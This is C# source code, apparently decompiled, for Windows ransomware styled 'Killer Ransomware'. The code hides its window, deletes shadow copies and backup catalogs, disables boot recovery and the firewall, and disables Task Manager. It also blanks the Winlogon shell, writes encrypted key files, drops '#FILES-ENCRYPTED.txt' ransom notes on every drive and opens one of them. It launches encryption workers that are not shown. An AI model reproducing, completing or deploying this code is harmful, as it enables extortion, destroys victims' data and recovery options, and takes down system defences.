using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace TSVT26;

internal class Program
{
	public enum ProtocolTypeEAF
	{
		SystemDefault = 0,
		Ssl3 = 48,
		Tls = 192,
		Tls11 = 768,
		Tls12 = 3072
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		ShowWindow(GetConsoleWindow(), 0);
		CheckMutex();
		installSelf();
		Reg();
		commands();
		Config.EncryptPassword = CreatePassword();
		Icon.SetIcon();
		RSA_EAF();
		spreadIt();
		addAndOpenNote();
		Cylance1.Start();
		Cylance2.Start();
		Cylance3.Start();
		Cylance4.Start();
	}

	private static void installSelf()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(Path.GetFullPath(Assembly.GetEntryAssembly()!.Location));
			fileInfo.Attributes |= FileAttributes.Hidden;
			fileInfo.Attributes |= FileAttributes.System;
		}
		catch
		{
		}
	}

	private static void spreadIt()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!File.Exists(driveInfo.ToString() + "#FILES-ENCRYPTED.txt"))
			{
				try
				{
					File.WriteAllLines(driveInfo.ToString() + "#FILES-ENCRYPTED.txt", Config.messages);
				}
				catch
				{
				}
			}
		}
	}

	private static void RSA_EAF()
	{
		try
		{
			string empty = string.Empty;
			try
			{
				string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.EncryptPassword));
				string s = "[" + Help.drivesInfo() + "][QWERTYUIOPASDFGHJKLZXCVBNM][1qw0ll8p9m8uezhqhyd][7z459ajrk722yn8c5j4fg][" + Help.UniqueID() + "]" + text + "[" + Help.UniqueID() + "][17CqMQFeuB3NTzJ][2X28tfRmWaPyPQgvoHV][QWERTYUIOPASDFGHJKLZXCVBNM]";
				empty = Convert.ToBase64String(AES_Encrypt(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes("QWERTYUIOP1234567890ASDFGHJKL1234567890ZXCVBNM1234567890")));
			}
			catch
			{
				byte[] bytes = Encoding.UTF8.GetBytes(Config.EncryptPassword);
				empty = "RSA_" + Convert.ToBase64String(bytes) + "_RSA";
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string text2 = "C:";
			try
			{
				if (!File.Exists("RSA." + Help.UniqueID() + ".kill"))
				{
					File.WriteAllText("RSA." + Help.UniqueID() + ".kill", empty);
				}
				if (!File.Exists(folderPath + "\\RSA." + Help.UniqueID() + ".kill"))
				{
					File.WriteAllText(folderPath + "\\RSA." + Help.UniqueID() + ".kill", empty);
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(text2 + "\\RSA." + Help.UniqueID() + ".kill"))
				{
					File.WriteAllText(text2 + "\\RSA." + Help.UniqueID() + ".kill", empty);
				}
				if (!File.Exists(folderPath2 + "\\RSA." + Help.UniqueID() + ".kill"))
				{
					File.WriteAllText(folderPath2 + "\\RSA." + Help.UniqueID() + ".kill", empty);
				}
			}
			catch
			{
			}
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					if (!File.Exists(driveInfo.ToString() + "RSA." + Help.UniqueID() + ".kill"))
					{
						try
						{
							File.WriteAllText(driveInfo.ToString() + "RSA." + Help.UniqueID() + ".kill", empty);
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		try
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1);
				aesCryptoServiceProvider.KeySize = 256;
				aesCryptoServiceProvider.BlockSize = 128;
				aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(32);
				aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(16);
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
		catch
		{
			return bytesToBeEncrypted;
		}
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\#FILES-ENCRYPTED.txt";
		try
		{
			File.WriteAllLines(text, Config.messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void commands()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		runCommand("bcdedit /set {default} recoveryenabled no");
		runCommand("netsh advfirewall set currentprofile state off");
		runCommand("netsh firewall set opmode mode=disable");
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
		runCommand("wbadmin delete catalog -quiet");
		runCommand("reagentc /disable");
	}

	private static void runCommand(string commands)
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = "cmd.exe",
				Arguments = "/C " + commands,
				WindowStyle = ProcessWindowStyle.Normal
			};
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static void Reg()
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", "empty", RegistryValueKind.String);
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("legalnoticecaption", "Killer Ransomware", RegistryValueKind.String);
			registryKey.SetValue("legalnoticetext", "You were attacked by the Killer Ransomware team plz read #FILES-ENCRYPTED.txt", RegistryValueKind.String);
			Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop").SetValue("Wallpaper", "", RegistryValueKind.String);
		}
		catch
		{
		}
	}

	private static void CheckMutex()
	{
		bool createdNew = false;
		string text = MD5("5452662471:AAEhh-hdszOf7jpRwk9AS3FSkpz1oYE7UP0");
		if (IsAdministrator())
		{
			text = "ADMIN:" + text;
		}
		new Mutex(initiallyOwned: false, text, out createdNew);
		if (!createdNew)
		{
			Environment.Exit(1);
		}
	}

	private static string MD5(string s)
	{
		using MD5 mD = System.Security.Cryptography.MD5.Create();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(s));
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2").ToLower());
		}
		return stringBuilder.ToString();
	}

	private static bool IsAdministrator()
	{
		using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
		return new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static string CreatePassword()
	{
		try
		{
			string text = GeneratePassword();
			string text2 = GeneratePassword();
			string text3 = GeneratePassword();
			string text4 = GeneratePassword();
			string text5 = GeneratePassword();
			string text6 = GeneratePassword();
			string text7 = GeneratePassword();
			string text8 = GeneratePassword();
			string text9 = GeneratePassword();
			string text10 = GeneratePassword();
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text10));
		}
		catch
		{
			return "VXNlciBJbmZvOgpFbWFpbCAxOiBIZWxwZXJAY3liZXJmZWFyLmNvbQpFbWFpbCAyOiBEZWNyeXB0aW9uQGN5YmVyZmVhci5jb20KSUQgMTogIzEyQjg4OTk0CgpDb21wdXRlciBpbmZvOgpTeXN0ZW06IFdpbmRvd3MgMTAgRW50ZXJwcmlzZSAoNjQgQml0KQpDb21wdXRlciBuYW1lOiBERVNLVE9QLURNOUpCOUEKVXNlciBuYW1lOiBOQkM2OTQKV2luZG93cyBuYW1lOiBXaW4gMTAKUHJvY2VzcyBOYW1lOiBleHBsb3JlcgpTeXN0ZW0gSW5mbzogZW4tVVMKU3lzdGVtIHRpbWU6IDIwMjItMDYtMjIgMTE6Mjk6MzAgQU0KClByb3RlY3Rpb246Ckluc3RhbGxlZCBhbnRpdmlydXM6IFdpbmRvd3MgRGVmZW5kZXIuClN0YXJ0ZWQgYXMgYWRtaW46IEZhbHNlClByb2Nlc3MgcHJvdGVjdGVkOiBGYWxzZQoKVmlydHVhbGl6YWlvbjoKRGVidWdnZXI6IEZhbHNlClNhbmRib3hpZTogRmFsc2UKVmlydHVhbEJveDogRmFsc2UKClNvZnR3YXJlOgpBcHBsaWNhdGlvbiBWZXJpZmllciwgQ29tbW9uIEZpbGVzLCBDVUFzc2lzdGFudCwgZG90bmV0LCBFY2xpcHNlIEZvdW5kYXRpb24sIEdvb2dsZSwgSW50ZXJuZXQgRXhwbG9yZXIsIE1pY3Jvc29mdCwgTWljcm9zb2Z0IFNRTCBTZXJ2ZXIsIE1pY3Jvc29mdCBVcGRhdGUgSGVhbHRoIFRvb2xzLCBNaWNyb3NvZnQgVmlzdWFsIFN0dWRpbywgbWluZ3ctdzY0LCBNb2RpZmlhYmxlV2luZG93c0FwcHMsIE5vdGVwYWQrKywgcmVtcGwsIFVuaW5zdGFsbCBJbmZvcm1hdGlvbiwgVmFsaWRpdHkgU2Vuc29ycywgV2luZG93cyBEZWZlbmRlciwgV2luZG93cyBEZWZlbmRlciBBZHZhbmNlZCBUaHJlYXQgUHJvdGVjdGlvbiwgV2luZG93cyBNYWlsLCBXaW5kb3dzIE1lZGlhIFBsYXllciwgV2luZG93cyBNdWx0aW1lZGlhIFBsYXRmb3JtLCBXaW5kb3dzIE5ULCBXaW5kb3dzIFBob3RvIFZpZXdlciwgV2luZG93cyBQb3J0YWJsZSBEZXZpY2VzLCBXaW5kb3dzIFNlY3VyaXR5LCBXaW5kb3dzIFNpZGViYXIsIFdpbmRvd3NBcHBzLCBXaW5kb3dzUG93ZXJTaGVsbCwgV2luUkFSLCBNaWNyb3NvZnQsIG1pY3Jvc29mdCBzaGFyZWQsIFNlcnZpY2VzLCBTeXN0ZW0uCgpIYXJkd2FyZToKQ1BVOiBJbnRlbChSKSBDb3JlKFRNKSBpNSBDUFUgICAgICAgTSA1MjAgIEAgMi40MEdIegpHUFU6IE1pY3Jvc29mdCBCYXNpYyBEaXNwbGF5IEFkYXB0ZXIKUkFNOiAzODk0TUIKSFdJRDogQkZFQkZCRkYwMDAyMDY1NQoKS2V5OgpudHVVTkU4VnoybDEyYUlOY1o1UXJQMmQwckdINERScnRnSlAyRmoySjZjZDYvbFNmNGR5UXhTQVB4QnhWTDk5VmpMWERrNFk0REdLNm9LVXhta0hEOW5iQlRRcWt1VENXam12bWJGY05BZlp1T1BRSVRLMEEvbThzalkwSi9uZjlvR05HSkJWWEIvM1JOUXBKekJrd0UxR09ZUWtOVm1obnFZcTFWRUsrZUwrUytkUmJod1lsZ20zSENubjhKcG0wWGoreXVHcUhHdUl3YWxYVHpiYUtYNFp2bzNaL2F0VTZQLzBSdHNNUm5rVi9pYWwKCkRhdGE6Ci0tLS0tLS0tLS0tLS0tLS0tLS0tDQpEcml2ZSBOYW1lIDogQzpcDQpUb3RhbCBTaXplIChHQikgOiAxMTgNClRvdGFsIFVzZWQgU3BhY2UgKEdCKSA6IDc2DQpUb3RhbCBGcmVlIFNwYWNlIChHQikgOiA0Mg0KRHJpdmUgVHlwZSA6IEZpeGVkDQpEcml2ZSBGb3JtYXQgOiBOVEZTDQotLS0tLS0tLS0tLS0tLS0tLS0tLQ0KCi4NCg";
		}
	}

	private static string GeneratePassword()
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[18];
		rNGCryptoServiceProvider.GetBytes(array);
		return Convert.ToBase64String(array);
	}
}
